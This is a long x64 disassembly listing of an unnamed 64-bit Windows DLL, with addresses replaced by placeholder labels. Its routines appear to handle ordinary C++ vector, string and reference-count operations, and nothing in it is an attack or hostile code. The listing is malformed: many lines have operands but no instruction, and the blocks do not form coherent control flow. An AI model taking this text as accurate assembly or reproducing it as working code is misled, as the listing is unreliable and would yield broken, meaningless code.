mov r8 [ rbx + 0x8 ]
mov rdx [ rbx ]
sub r8 rdx
and r8 0xfffffffffffffff8
mov rcx rax
call sub_18001c4a0
nop
mov rcx [ rbx ]
mov r12 [ rbx + 0x8 ]
sub r12 rcx
sar r12 0x3
test rcx rcx
je r-xdata
lea rax [ rsi + rdi * 8 ]
mov [ rbx + 0x10 ] rax
lea rax [ rsi + r12 * 8 ]
mov [ rbx + 0x8 ] rax
mov [ rbx ] rsi
call j_sub_18001c80c
sub_1800037e0
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x40 ] rbx
mov rbx rdx
mov rdi rcx
mov ecx 0x18
call sub_18001c84c
test rax rax
je r-xdata
mov r8 rax
mov rdx rbx
mov rcx rdi
call sub_1800011a0
nop
mov rbx [ rsp + 0x40 ]
add rsp 0x30
pop rdi
retn
mov [ rax + 0x8 ] 0x1
mov [ rax + 0xc ] 0x1
lea rcx [ r--data ]
mov [ rax ] rcx
mov [ rax + 0x10 ] rbx
sub_180003850
mov rax rsp
push rdi
sub rsp 0x90
mov [ rsp + 0x28 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x80 ] rax
mov rdi rcx
mov ecx 0x30
call sub_18001c84c
mov [ rsp + 0x20 ] rax
xor esi esi
test rax rax
je r-xdata
mov rbx rsi
mov rcx rax
call sub_180008850
mov rbx rax
jmp r-xdata
mov rcx [ rdi + 0x58 ]
mov rax [ rcx ]
call [ rax + 0x28 ]
lea r8 [ rsp + 0x30 ]
cmp [ rsp + 0x48 ] 0x8
cmovae r8 [ rsp + 0x30 ]
lea rdx [ rsp + 0x58 ]
cmp [ rsp + 0x70 ] 0x8
cmovae rdx [ rsp + 0x58 ]
mov rcx [ rdi + 0x70 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
nop
cmp [ rsp + 0x48 ] 0x8
jb r-xdata
mov rcx rbx
call sub_180008890
mov rcx rbx
call j_sub_18001c80c
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088d0
mov r8d 0x24
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x58 ]
mov rcx rbx
call sub_1800092e0
nop
mov r8d 0x1c
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800088c0
lea rdx [ rsp + 0x30 ]
mov rcx rbx
call sub_1800092e0
nop
test rbx rbx
je r-xdata
mov [ rsp + 0x48 ] 0x7
mov [ rsp + 0x40 ] rsi
mov [ rsp + 0x30 ] si
cmp [ rsp + 0x70 ] 0x8
jb r-xdata
mov rcx [ rsp + 0x30 ]
call j_sub_18001c80c
mov rcx [ rsp + 0x80 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
mov rcx [ rsp + 0x58 ]
call j_sub_18001c80c
sub_1800039b0
push rbx
sub rsp 0x20
xor eax eax
mov rbx rcx
mov [ rcx ] rax
mov [ rcx + 0x8 ] rax
mov r8 [ rdx + 0x8 ]
mov rdx [ rdx ]
test r8 r8
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
nop [ rax + rax ] ax
mov rcx rbx
call sub_1800011a0
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_180003a10
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx ]
test rcx rcx
je r-xdata
xor eax eax
mov [ rbx ] rax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] rax
add rsp 0x20
pop rbx
retn
call j_sub_18001c80c
sub_180003a40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi [ rdx + 0x10 ]
mov rbp r8
mov rsi rdx
mov rbx rcx
cmp rdi r8
jae r-xdata
sub rdi r8
cmp r9 rdi
cmovb rdi r9
cmp rcx rdx
jne r-xdata
lea rcx [ r--data ]
call sub_18001c1d8
cmp rdi 0xfffffffffffffffe
jbe r-xdata
lea rdx [ rdi + r8 ]
or r8 0xffffffffffffffff
call sub_1800032e0
mov r8 rbp
xor edx edx
mov rcx rbx
call sub_1800032e0
jmp r-xdata
mov rax [ rcx + 0x18 ]
cmp rax rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
test rdi rdi
jne r-xdata
mov r8 [ rcx + 0x10 ]
mov rdx rdi
call sub_180003380
test rdi rdi
je r-xdata
cmp [ rsi + 0x18 ] 0x10
jb r-xdata
mov [ rcx + 0x10 ] rdi
cmp rax 0x10
jb r-xdata
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rsi [ rsi ]
mov rax rcx
mov [ rcx ] 0x0
jmp r-xdata
mov rax [ rcx ]
mov [ rax ] dil
jmp r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
lea rdx [ rsi + rbp ]
mov r8 rdi
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x10
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov [ rax + rdi ] 0x0
sub_180003b50
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r8
mov rsi rdx
mov rbx rcx
test rdx rdx
je r-xdata
mov rax 0x7ffffffffffffffe
cmp rdi rax
jbe r-xdata
mov r8 [ rcx + 0x18 ]
cmp r8 0x8
jb r-xdata
mov rcx [ rbx + 0x18 ]
cmp rcx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rax rcx
mov rax [ rcx ]
jmp r-xdata
test rdi rdi
jne r-xdata
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx rbx
call sub_180001330
test rdi rdi
je r-xdata
cmp r8 0x8
jb r-xdata
cmp rdx rax
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rbp
jb r-xdata
xor eax eax
mov [ rbx + 0x10 ] rax
cmp rcx 0x8
jb r-xdata
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
mov rax [ rbx + 0x10 ]
lea rcx [ rcx + rax * 2 ]
cmp rcx rdx
jbe r-xdata
mov rcx [ rcx ]
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
mov [ rbx ] ax
mov rcx rbx
mov rax rbx
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
mov rcx [ rbx ]
mov [ rcx ] ax
mov rax rbx
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
cmp r8 0x8
jb r-xdata
mov rcx rbx
mov rcx [ rbx ]
jmp r-xdata
lea rbp [ rdi + rdi ]
mov rdx rsi
mov r8 rbp
call sub_18001c4a0
cmp [ rbx + 0x18 ] 0x8
mov [ rbx + 0x10 ] rdi
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
xor eax eax
mov [ rcx + rbp ] ax
mov rbp [ rsp + 0x30 ]
sub rsi rax
mov r9 rdi
mov rdx rbx
sar rsi 0x1
mov rcx rbx
mov r8 rsi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp sub_180001ac0
sub_180003cb0
sub rsp 0x28
mov r10 [ rcx ]
mov r8 [ rcx + 0x8 ]
mov r9 0x1fffffffffffffff
sub r8 r10
mov rax r9
sar r8 0x3
sub rax rdx
cmp rax r8
jae r-xdata
add r8 rdx
mov rdx [ rcx + 0x10 ]
sub rdx r10
sar rdx 0x3
cmp r8 rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
add rsp 0x28
retn
mov rax rdx
shr rax 0x1
sub r9 rax
cmp r9 rdx
jae r-xdata
add rdx rax
cmp rdx r8
cmovb rdx r8
call sub_180003720
xor edx edx
cmp rdx r8
cmovb rdx r8
add rsp 0x28
jmp sub_180003720
sub_180003d30
mov rax rsp
mov [ rax + 0x10 ] rdx
push rbp
push r12
push r13
push r14
push r15
mov rbp rsp
sub rsp 0x60
mov [ rbp - 0x40 ] 0xfffffffffffffffe
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rsi
mov [ rax + 0x20 ] rdi
mov r14 rdx
mov rsi rcx
mov rcx [ rcx + 0x50 ]
mov rax [ rcx ]
mov rdx [ rdx ]
call [ rax + 0x10 ]
xor r15d r15d
mov [ rbp - 0x38 ] r15
mov [ rbp - 0x30 ] r15
mov rdx rax
lea rcx [ rbp - 0x38 ]
call sub_1800034c0
nop
mov r13 [ rbp - 0x38 ]
test r13 r13
jne r-xdata
mov rcx [ r13 ]
mov rax [ rsi + 0xa0 ]
cmp rcx [ rax ]
je r-xdata
mov rcx [ rbp - 0x30 ]
test rcx rcx
je r-xdata
xor r12b r12b
mov rcx [ rsi + 0x78 ]
mov rax [ rsi + 0x80 ]
sub rax rcx
sar rax 0x3
test rax rax
je r-xdata
movzx eax [ rsi + 0x98 ]
cmp al 0xff
je r-xdata
jmp r-xdata
[ rcx + 0x8 ]
jne r-xdata
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rdi r15
nop [ rax + rax ] ax
movzx ecx al
mov rax [ rsi + 0x78 ]
mov rbx [ rax + rcx * 8 ]
mov [ rbp - 0x28 ] r15
mov [ rbp - 0x20 ] r15
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rbx [ r14 + 0x8 ]
test rbx rbx
je r-xdata
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
[ rdx + 0x8 ]
jne r-xdata
inc r12b
mov rcx [ rsi + 0x78 ]
movzx edi r12b
mov rax [ rsi + 0x80 ]
sub rax rcx
sar rax 0x3
cmp rdi rax
jb r-xdata
mov rax [ rsi + 0x78 ]
mov rbx [ rax + rdi * 8 ]
mov [ rbp - 0x18 ] r15
mov [ rbp - 0x10 ] r15
mov rdx [ rbp - 0x30 ]
test rdx rdx
je r-xdata
mov rax [ rbx ]
lea rdx [ rbp - 0x28 ]
mov rcx rbx
call [ rax + 0x8 ]
jmp r-xdata
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
lea r11 [ rsp + 0x60 ]
mov rbx [ r11 + 0x30 ]
mov rsi [ r11 + 0x40 ]
mov rdi [ r11 + 0x48 ]
mov rsp r11
pop r15
pop r14
pop r13
pop r12
pop rbp
retn
[ rbx + 0x8 ]
jne r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
mov rbx [ rbp - 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
movzx ebx [ r13 + 0x8 ]
mov rax [ rcx ]
call [ rax + 0x18 ]
cmp ax bx
jne r-xdata
mov rax [ rbx ]
lea rdx [ rbp - 0x18 ]
mov rcx rbx
call [ rax + 0x8 ]
mov eax [ rdx + 0x8 ]
test eax eax
je r-xdata
nop
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rbp - 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
nop
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
mov r8 [ rbp - 0x30 ]
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x28 ]
call sub_1800011a0
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
mov r8 [ rbp - 0x30 ]
mov rdx [ rbp - 0x38 ]
lea rcx [ rbp - 0x18 ]
call sub_1800011a0
mov eax [ rdx + 0x8 ]
test eax eax
jne r-xdata
lea ecx [ rax + 0x1 ]
[ rdx + 0x8 ] ecx
je r-xdata
jmp r-xdata
jmp r-xdata
sub_180003f60
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
xor esi esi
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rcx ]
call j_sub_18001c80c
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_18001c4a0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] 0x7
mov [ rdi ] si
mov rsi [ rsp + 0x30 ]
sub_180004000
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x10 ] rdx
push rsi
push rdi
push r12
sub rsp 0x20
mov rbx [ rcx + 0x78 ]
mov r12 rdx
mov rbp rcx
cmp rbx [ rcx + 0x80 ]
je r-xdata
mov rax [ rbp + 0x80 ]
lea rcx [ rsp + 0x48 ]
cmp rcx rax
jae r-xdata
nop [ rax + rax ] ax
cmp rax [ rbp + 0x88 ]
jne r-xdata
mov rcx [ rbp + 0x78 ]
lea rdx [ rsp + 0x48 ]
cmp rcx rdx
ja r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
add rbx 0x8
cmp rbx [ rbp + 0x80 ]
jne r-xdata
mov rax [ rbp + 0x80 ]
test rax rax
je r-xdata
lea rcx [ rbp + 0x78 ]
mov edx 0x1
call sub_180003cb0
lea rbx [ rsp + 0x48 ]
sub rbx rcx
sar rbx 0x3
cmp rax [ rbp + 0x88 ]
jne r-xdata
mov rcx [ rbx ]
mov rax [ rcx ]
call [ rax + 0x18 ]
mov rdx [ r12 ]
mov rcx r12
movzx edi ax
call [ rdx + 0x18 ]
cmp ax di
je r-xdata
add [ rbp + 0x80 ] 0x8
mov [ rax ] r12
mov rdx [ rbp + 0x80 ]
test rdx rdx
je r-xdata
lea rcx [ rbp + 0x78 ]
mov edx 0x1
call sub_180003cb0
mov rax [ rbp + 0x78 ]
mov rcx [ rax + rbx * 8 ]
mov [ rdx ] rcx
jmp r-xdata
sub_180004100
mov [ rsp + 0x20 ] rbx
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x20
lea rbx [ rcx + 0xa0 ]
xor r8b r8b
mov rdi rdx
mov rcx [ rbx + 0x8 ]
sub rcx [ rbx ]
sar rcx 0x3
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x8 ]
lea rax [ rsp + 0x38 ]
mov [ rsp + 0x30 ] rbp
mov [ rsp + 0x40 ] rsi
cmp rax rcx
jae r-xdata
mov rdx [ rbx ]
xor eax eax
mov rdx [ rbx + 0x10 ]
mov rbp 0x1ffffffffffffffe
mov rsi 0x1fffffffffffffff
cmp rcx rdx
jne r-xdata
mov rax [ rbx ]
lea rdx [ rsp + 0x38 ]
cmp rax rdx
ja r-xdata
xor al al
mov rbx [ rsp + 0x48 ]
add rsp 0x20
pop rdi
retn
inc r8b
movzx eax r8b
cmp rax rcx
jb r-xdata
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
mov rax [ rbx ]
sub rcx rax
sar rcx 0x3
cmp rcx rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
lea rdi [ rsp + 0x38 ]
mov rbp 0x1ffffffffffffffe
sub rdi rax
mov rsi 0x1fffffffffffffff
sar rdi 0x3
cmp rcx rdx
jne r-xdata
cmp [ rdx + rax * 8 ] rdi
je r-xdata
add [ rbx + 0x8 ] 0x8
mov rdi [ rbx ]
mov rax [ rbx + 0x8 ]
cmp rdi rax
jae r-xdata
mov [ rax ] rdi
sub rdx rax
inc rcx
sar rdx 0x3
cmp rcx rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
sub rcx rax
sar rcx 0x3
cmp rcx rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
cmp rax rdx
jne r-xdata
mov rcx rdi
cmp rdi rdi
ja r-xdata
mov r8 rdx
mov rax rsi
shr r8 0x1
sub rax r8
cmp rax rdx
jae r-xdata
mov rax [ rbx ]
mov rcx [ rax + rdi * 8 ]
mov [ rdx ] rcx
jmp r-xdata
sub rdx rax
inc rcx
sar rdx 0x3
cmp rcx rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
sub rax rdi
sar rax 0x3
cmp rax rbp
jbe r-xdata
mov rdx [ rbx + 0x10 ]
sub rdi rdi
sar rdi 0x3
cmp rax rdx
jne r-xdata
add rdx r8
xor edx edx
jmp r-xdata
mov r8 rdx
mov rax rsi
shr r8 0x1
sub rax r8
cmp rax rdx
jae r-xdata
add [ rbx + 0x8 ] 0x8
mov rbp [ rsp + 0x30 ]
mov rsi [ rsp + 0x40 ]
mov rbx [ rsp + 0x48 ]
mov al 0x1
add rsp 0x20
pop rdi
retn
mov rax [ rdi ]
mov [ rcx ] rax
sub rdx rdi
inc rax
sar rdx 0x3
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
mov rdx [ rbx + 0x8 ]
test rdx rdx
je r-xdata
sub rax rcx
sar rax 0x3
cmp rax rbp
jbe r-xdata
cmp rdx rcx
cmovb rdx rcx
mov rcx rbx
call sub_180003720
add rdx r8
xor edx edx
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub rsi rcx
cmp rsi rdx
jae r-xdata
mov rax [ rbx ]
mov rcx [ rax + rdi * 8 ]
mov [ rdx ] rcx
jmp r-xdata
sub rdx rcx
inc rax
sar rdx 0x3
cmp rax rdx
jbe r-xdata
lea rcx [ r--data ]
call sub_18001c17c
cmp rdx rcx
cmovb rdx rcx
mov rcx rbx
call sub_180003720
add rdx rcx
xor edx edx
jmp r-xdata
mov rcx rdx
shr rcx 0x1
sub rsi rcx
cmp rsi rdx
jae r-xdata
cmp rdx rax
mov rcx rbx
cmovb rdx rax
call sub_180003720
add rdx rcx
xor edx edx
jmp r-xdata
cmp rdx rax
mov rcx rbx
cmovb rdx rax
call sub_180003720
sub_1800043a0
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x30
mov rsi r8
mov rbp rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rbp [ rsp + 0x50 ]
mov rax rsi
mov rsi [ rsp + 0x58 ]
add rsp 0x30
pop rdi
retn
mov [ rsp + 0x48 ] r12
xor r12d r12d
mov [ rsp + 0x40 ] rbx
nop
mov rcx [ rsi + 0x8 ]
mov [ rsi + 0x8 ] r8
mov [ rsi ] rax
mov [ rsp + 0x28 ] rcx
test rcx rcx
je r-xdata
mov r8 [ rdi + 0x8 ]
mov [ rdi + 0x8 ] r12
mov rax [ rdi ]
mov [ rsp + 0x20 ] rax
mov [ rdi ] r12
add rdi 0x10
add rsi 0x10
cmp rdi rbp
jne r-xdata
[ rcx + 0x8 ]
jne r-xdata
lea rcx [ rsp + 0x20 ]
mov rax r12
mov r8 r12
mov [ rsp + 0x20 ] rax
cmp rcx rdi
je r-xdata
mov r12 [ rsp + 0x48 ]
mov rbx [ rsp + 0x40 ]
mov rbx [ rsp + 0x28 ]
mov rcx rbx
mov rax [ rbx ]
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rcx [ rsp + 0x28 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
sub_180004460
mov [ rsp + 0x10 ] rdx
push rdi
sub rsp 0x60
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x70 ] rbx
mov rbx rdx
mov rdi rcx
mov rdx [ rdx ]
cmp [ rdx ] 0x0
je r-xdata
mov rax [ rcx + 0xa0 ]
mov rcx [ rax ]
mov [ rdx ] rcx
mov r8 [ rdx ]
mov rax [ rcx + 0xa0 ]
cmp r8 [ rax ]
je r-xdata
xor eax eax
mov [ rsp + 0x48 ] rax
mov [ rsp + 0x50 ] rax
mov r8 [ rbx + 0x8 ]
test r8 r8
je r-xdata
cmp [ rdx + 0xa ] 0x34
je r-xdata
mov rdx r8
call sub_180004100
jmp r-xdata
mov rax [ rdi ]
lea rdx [ rsp + 0x48 ]
mov rcx rdi
call [ rax + 0x8 ]
nop
mov rbx [ rbx + 0x8 ]
test rbx rbx
je r-xdata
mov eax [ r8 + 0x8 ]
test eax eax
je r-xdata
cmp [ rdx + 0xa ] 0x35
je r-xdata
mov rdx [ rbx ]
cmp [ rdx + 0xa ] 0x33
je r-xdata
mov rbx [ rsp + 0x70 ]
add rsp 0x60
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
nop [ rax + rax ] eax
cmp [ rdx + 0xa ] 0x36
je r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
lea rcx [ rsp + 0x48 ]
call sub_1800011a0
mov eax [ r8 + 0x8 ]
test eax eax
jne r-xdata
mov rcx [ rdi + 0x50 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
mov rdx rax
test rax rax
jne r-xdata
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x8 ]
lea ecx [ rax + 0x1 ]
[ r8 + 0x8 ] ecx
je r-xdata
jmp r-xdata
mov rax [ rbx ]
movzx ecx [ rax + 0x11 ]
xor eax eax
cmp cl [ rw-data ]
jne r-xdata
mov rcx rbx
call sub_180009660
jmp r-xdata
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x40 ] rax
lea rcx [ rsp + 0x38 ]
call sub_180001480
mov rcx [ rdi + 0x60 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x38 ]
call [ rax + 0x18 ]
nop
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x30 ] rax
lea rcx [ rsp + 0x28 ]
call sub_180001480
mov rcx [ rdi + 0x60 ]
mov rax [ rcx ]
lea rdx [ rsp + 0x28 ]
call [ rax + 0x10 ]
jmp r-xdata
mov rcx rbx
call sub_180009660
jmp r-xdata
sub_1800045e0
mov rax rsp
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov [ rax + 0x20 ] rsi
mov r12d r9d
mov rbp r8
mov r13 rdx
mov rsi rcx
mov ecx 0x28
call sub_18001c84c
mov rdi rax
mov [ rsp + 0x70 ] rax
test rax rax
je r-xdata
xor ebx ebx
mov edi ebx
mov rax [ rsi ]
mov rcx rsi
call [ rax + 0x18 ]
xor ebx ebx
mov [ rdi ] rbx
mov [ rdi + 0x8 ] ax
movzx eax [ rsp + 0x98 ]
mov [ rdi + 0xa ] al
mov [ rdi + 0xc ] r12d
movzx eax [ rsp + 0x90 ]
mov [ rdi + 0x10 ] al
mov [ rdi + 0x18 ] r13
mov [ rdi + 0x20 ] rbp
movzx ecx [ rw-data ]
movzx eax [ rw-data ]
cmp rbp 0x200000
cmova ecx eax
mov [ rdi + 0x11 ] cl
jmp r-xdata
mov [ rsp + 0x38 ] rbx
mov [ rsp + 0x40 ] rbx
mov rbx [ rsp + 0x30 ]
test rbx rbx
je r-xdata
mov rax [ rsi + 0xa0 ]
mov rcx [ rax ]
mov rax [ rsp + 0x28 ]
mov [ rax ] rcx
mov [ rsp + 0x28 ] rbx
mov [ rsp + 0x30 ] rbx
mov rdx rdi
lea rcx [ rsp + 0x28 ]
call sub_1800034c0
nop
mov rax [ rsi + 0xa8 ]
cmp [ rsi + 0xa0 ] rax
je r-xdata
lea rdx [ rsp + 0x38 ]
mov rcx rsi
call sub_180004460
nop
test rbx rbx
je r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
je r-xdata
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
[ rbx + 0x8 ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
nop
mov rbx [ rsp + 0x30 ]
mov rax [ rbx ]
mov rcx rbx
call [ rax ]
[ rbx + 0xc ]
jne r-xdata
mov rbx [ rsp + 0x30 ]
mov r8 rbx
mov rdx [ rsp + 0x28 ]
lea rcx [ rsp + 0x38 ]
call sub_1800011a0
jmp r-xdata
mov eax [ rbx + 0x8 ]
test eax eax
jne r-xdata
mov rcx [ rsp + 0x30 ]
mov rax [ rcx ]
call [ rax + 0x8 ]
lea ecx [ rax + 0x1 ]
[ rbx + 0x8 ] ecx
je r-xdata
jmp r-xdata
sub_180004760
mov r11 rsp
push rdi
push r12
push r13
sub rsp 0x50
mov [ rsp + 0x30 ] 0xfffffffffffffffe
mov [ r11 + 0x18 ] rbx
mov [ r11 + 0x20 ] rbp
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x40 ] rax
movzx ebp r9b
mov r12d r8d
mov rbx rdx
mov r13 rcx
mov [ r11 - 0x30 ] rdx
mov edx 0x1
mov rcx [ rbx + 0x10 ]
call sub_18001d210
mov rdi rax
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov [ rbx ] 0x0
mov rcx [ rsp + 0x40 ]
xor rcx rsp
call sub_18001d1f0
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
mov rcx [ rbx ]
call j_sub_18001c80c
mov r8 [ rbx + 0x10 ]
mov rcx rax
call sub_18001c4a0
movzx eax [ rsp + 0x90 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] bpl
mov r9d r12d
mov r8 [ rbx + 0x10 ]
mov rdx rdi
mov rcx r13
call sub_1800045e0
nop
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
sub_180004840
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
xor esi esi
mov rbx rcx
cmp [ rcx + 0x20 ] rsi
je r-xdata
mov rdi [ rbx + 0x10 ]
test rdi rdi
je r-xdata
nop [ rax + rax ] ax
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
nop [ rax + rax ] ax
cmp [ rbx + 0x20 ] rsi
jne r-xdata
mov rax [ rbx + 0x18 ]
lea rcx [ rcx + rax - 0x1 ]
mov rax [ rbx + 0x10 ]
cmp rax rcx
ja r-xdata
mov [ rbx + 0x8 ] rsi
mov [ rbx + 0x10 ] rsi
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
call j_sub_18001c80c
test rdi rdi
jne r-xdata
mov rcx [ rcx + rdi * 8 ]
call j_sub_18001c80c
mov rcx [ rbx + 0x20 ]
test rcx rcx
je r-xdata
mov rax [ rbx + 0x8 ]
mov rcx [ rax + rcx * 8 ]
mov rdi [ rcx + 0x8 ]
test rdi rdi
je r-xdata
sub rcx rax
mov rcx [ rbx + 0x8 ]
dec rdi
cmp [ rcx + rdi * 8 ] rsi
je r-xdata
dec [ rbx + 0x20 ]
jne r-xdata
[ rdi + 0x8 ]
jne r-xdata
mov [ rbx + 0x18 ] rsi
mov rax [ rdi ]
mov rcx rdi
call [ rax ]
[ rdi + 0xc ]
jne r-xdata
mov rax [ rdi ]
mov rcx rdi
call [ rax + 0x8 ]
sub_180004920
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r8
mov rsi rdx
mov rdi rcx
cmp rcx rdx
je r-xdata
mov rsi [ rsp + 0x38 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax ] eax
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rdi
mov rcx rbx
call sub_180001ac0
add rdi 0x28
add rbx 0x28
cmp rdi rsi
jne r-xdata
sub_180004980
mov [ rsp + 0x20 ] r9
mov [ rsp + 0x18 ] r8
push rbx
push rsi
push rdi
push r12
sub rsp 0x38
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x60 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
add rsp 0x38
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x68 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x70 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
